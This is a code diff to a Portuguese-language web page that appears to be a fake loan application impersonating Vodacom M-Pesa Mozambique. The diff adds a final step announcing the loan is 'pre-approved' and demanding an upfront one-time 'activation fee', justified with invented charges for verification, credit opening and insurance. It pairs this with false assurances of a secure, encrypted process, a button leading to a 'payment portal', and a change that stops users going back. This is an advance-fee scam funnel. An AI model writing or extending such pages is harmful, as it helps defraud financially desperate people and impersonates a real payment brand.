@@ -273,6 +273,13 @@
                     <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/2032284b-8ea9-43ac-b7c5-3d37319d8075/players/6ad119cca2a8ffe04faeef29/v4/player.js", s.async=!0,document.head.appendChild(s); </script>
                 </div>
 
+                <!-- Botão Finalizar Empréstimo -->
+                <div class="mb-6">
+                    <button type="button" id="btn-finalizar" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3.5 px-6 rounded-xl shadow-lg transition duration-200 text-base cursor-pointer">
+                        Finalizar Empréstimo
+                    </button>
+                </div>
+
                 <!-- Sound Alert Box -->
                 <div class="bg-red-50 border border-red-200 rounded-xl p-3 mb-4 text-center">
                     <p class="text-xs font-medium text-red-800 mb-2">Certifique-se de que o som está ligado</p>
@@ -476,6 +483,62 @@
 
             </div>
 
+            <!-- STEP 9: Pedido Pré-aprovado & Taxa de Ativação -->
+            <div id="step-9" class="step-content hidden p-6">
+                <div class="text-center mb-5">
+                    <span class="bg-green-100 text-mpesagreen text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider">Pedido pré-aprovado</span>
+                    <h2 class="text-xl font-extrabold text-gray-900 mt-2">Falta apenas um passo para receber o seu dinheiro</h2>
+                    <p class="text-xs text-gray-600 mt-1 leading-relaxed">
+                        Os seus dados foram analisados e o seu empréstimo está reservado. Antes da aprovação final existe uma taxa única de ativação.
+                    </p>
+                </div>
+
+                <!-- Info Box -->
+                <div class="bg-red-50 border border-red-100 rounded-xl p-4 mb-5 text-xs text-gray-700 space-y-3">
+                    <h3 class="font-bold text-vodared text-sm">Porque é que a taxa é paga antes?</h3>
+                    <p class="leading-relaxed">
+                        Sabemos que quem pede um empréstimo precisa de dinheiro — por isso a taxa é propositadamente baixa e única. Ela não é o pagamento do empréstimo: é o custo de abrir e proteger o crédito, e é o que nos permite emprestar sem exigir garantias, fiador, banco ou bens em seu nome.
+                    </p>
+                    
+                    <div class="space-y-2 pt-2 border-t border-red-200">
+                        <div>
+                            <strong class="text-gray-900 block">✔ Validação do seu processo</strong>
+                            <p class="text-gray-600">A taxa cobre a verificação de identidade, análise de risco e o registo oficial do contrato no sistema de crédito.</p>
+                        </div>
+                        <div>
+                            <strong class="text-gray-900 block">✔ Abertura do crédito no M-Pesa</strong>
+                            <p class="text-gray-600">É o custo administrativo para abrir a linha de crédito e ligar o valor aprovado à sua conta M-Pesa.</p>
+                        </div>
+                        <div>
+                            <strong class="text-gray-900 block">✔ Seguro de proteção do empréstimo</strong>
+                            <p class="text-gray-600">Garante que, em caso de imprevisto, o seu crédito fica protegido e o seu nome não é penalizado.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Highlights Cards -->
+                <div class="grid grid-cols-3 gap-2 text-center mb-5 text-[11px]">
+                    <div class="bg-gray-50 p-2.5 rounded-xl border border-gray-200">
+                        <span class="font-bold text-gray-900 block">Sem descontos surpresa</span>
+                        <span class="text-gray-500">Valor integral na conta</span>
+                    </div>
+                    <div class="bg-gray-50 p-2.5 rounded-xl border border-gray-200">
+                        <span class="font-bold text-gray-900 block">Taxa única</span>
+                        <span class="text-gray-500">Não recorrente</span>
+                    </div>
+                    <div class="bg-gray-50 p-2.5 rounded-xl border border-gray-200">
+                        <span class="font-bold text-gray-900 block">100% M-Pesa</span>
+                        <span class="text-gray-500">No seu número</span>
+                    </div>
+                </div>
+
+                <button type="button" onclick="alert('Redirecionando para o portal de pagamento seguro M-Pesa...')" class="w-full bg-mpesagreen hover:bg-emerald-700 text-white font-bold py-3.5 px-6 rounded-xl shadow-lg transition duration-200 text-sm cursor-pointer mb-3">
+                    Entendi, continuar para pagamento
+                </button>
+
+                <p class="text-[10px] text-gray-400 text-center">Processo seguro e encriptado · Vodacom M-Pesa Moçambique</p>
+            </div>
+
         </div>
     </main>
 
@@ -491,7 +554,7 @@
         const formData = {};
 
         function updateView() {
-            for (let i = 0; i <= 8; i++) {
+            for (let i = 0; i <= 9; i++) {
                 const el = document.getElementById(`step-${i}`);
                 if (el) el.classList.add('hidden');
             }
@@ -500,7 +563,7 @@
             if (currentEl) currentEl.classList.remove('hidden');
 
             const progHeader = document.getElementById('progress-header');
-            if (currentStep === 0 || currentStep === 8) {
+            if (currentStep === 0 || currentStep === 8 || currentStep === 9) {
                 progHeader.classList.add('hidden');
             } else {
                 progHeader.classList.remove('hidden');
@@ -511,7 +574,7 @@
         }
 
         function nextStep() {
-            if (currentStep < 8) {
+            if (currentStep < 9) {
                 currentStep++;
                 updateView();
                 window.scrollTo({ top: 0, behavior: 'smooth' });
@@ -519,7 +582,7 @@
         }
 
         function prevStep() {
-            if (currentStep > 1) {
+            if (currentStep > 1 && currentStep <= 7) {
                 currentStep--;
                 updateView();
                 window.scrollTo({ top: 0, behavior: 'smooth' });
@@ -612,6 +675,12 @@
 
             document.getElementById('btn-step7').addEventListener('click', () => {
                 currentStep = 8;
+                updateView();
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+
+            document.getElementById('btn-finalizar').addEventListener('click', () => {
+                currentStep = 9;
                 updateView();
                 window.scrollTo({ top: 0, behavior: 'smooth' });
             });
